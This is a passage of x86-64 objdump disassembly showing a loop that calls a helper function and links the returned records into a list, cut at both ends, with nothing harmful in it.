   2dc4955ec:	80 38 45             	cmpb   $0x45,(%rax)
   2dc4955ef:	0f 85 7b ff ff ff    	jne    0x2dc495570
   2dc4955f5:	48 83 c0 01          	add    $0x1,%rax
   2dc4955f9:	ba 5a 00 00 00       	mov    $0x5a,%edx
   2dc4955fe:	48 89 43 18          	mov    %rax,0x18(%rbx)
   2dc495602:	eb 91                	jmp    0x2dc495595
   2dc495604:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   2dc49560b:	00 00 00 00 
   2dc49560f:	90                   	nop
   2dc495610:	57                   	push   %rdi
   2dc495611:	56                   	push   %rsi
   2dc495612:	53                   	push   %rbx
   2dc495613:	48 83 ec 30          	sub    $0x30,%rsp
   2dc495617:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
   2dc49561e:	00 00 
   2dc495620:	48 89 ce             	mov    %rcx,%rsi
   2dc495623:	48 89 d7             	mov    %rdx,%rdi
   2dc495626:	48 8d 5c 24 28       	lea    0x28(%rsp),%rbx
   2dc49562b:	eb 0a                	jmp    0x2dc495637
   2dc49562d:	0f 1f 00             	nopl   (%rax)
   2dc495630:	48 89 03             	mov    %rax,(%rbx)
   2dc495633:	48 8d 58 18          	lea    0x18(%rax),%rbx
   2dc495637:	48 89 fa             	mov    %rdi,%rdx
   2dc49563a:	48 89 f1             	mov    %rsi,%rcx
   2dc49563d:	e8 de fe ff ff       	call   0x2dc495520
   2dc495642:	48 85 c0             	test   %rax,%rax
   2dc495645:	75 e9                	jne    0x2dc495630
   2dc495647:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
   2dc49564c:	4d 85 c0             	test   %r8,%r8
   2dc49564f:	74 1f                	je     0x2dc495670
   2dc495651:	45 31 c9             	xor    %r9d,%r9d
   2dc495654:	ba 57 00 00 00       	mov    $0x57,%edx
   2dc495659:	48 89 f1             	mov    %rsi,%rcx
   2dc49565c:	48 83 c4 30          	add    $0x30,%rsp
   2dc495660:	5b                   	pop    %rbx
   2dc495661:	5e                   	pop    %rsi
   2dc495662:	5f                   	pop    %rdi
